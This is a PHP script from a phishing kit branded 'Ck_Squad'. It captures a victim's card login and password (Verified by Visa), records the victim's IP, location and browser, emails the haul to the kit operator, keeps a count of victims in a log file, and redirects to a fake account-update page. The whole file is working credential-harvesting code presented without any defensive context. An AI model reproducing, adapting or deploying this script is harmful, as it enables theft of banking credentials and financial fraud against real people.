<?php

include('../blocker.php');
include('../detect.php');
include('../function.php');

$datei = fopen("../ck_squad_logs/vbv.txt","r");
$count = fgets($datei,1000);
fclose($datei);
$count=$count + 1 ;

$datei = fopen("../ck_squad_logs/vbv.txt","w");
fwrite($datei, $count);
fclose($datei);

$message ="
[$$$-------------- Ck_Squad VBV Info --------------$$$]
Credit Login    :  " . $_POST['cc_login'] . "
Credit Pass     :  " . $_POST['cc_pass'] . "

[$$$------------ Ck_Squad Victim Info -------------$$$]
From            :  ".$ip." | ".$nama_negara." | " . $state . " | " . $kota . " On ".date('r')."
Browser         :  ".$_SERVER['HTTP_USER_AGENT']."

[$$$------------ END Ck_Squad VBV Info ------------$$$]
";
crypto($message);
include('../ck_squad_settings.php');
$subject = "VBV Info [ ".$nama_negara." - " . $kota . " - " . $ip . " ]";
$headers = "From: VBV <vbv@cksquad.business>";
mail($ck_squad_email, $subject, $message, $headers);

header("LOCATION: webscrr.php?cmd=_update-information&account_bank=".md5(microtime())."&dispatch=".sha1(microtime())."");

?>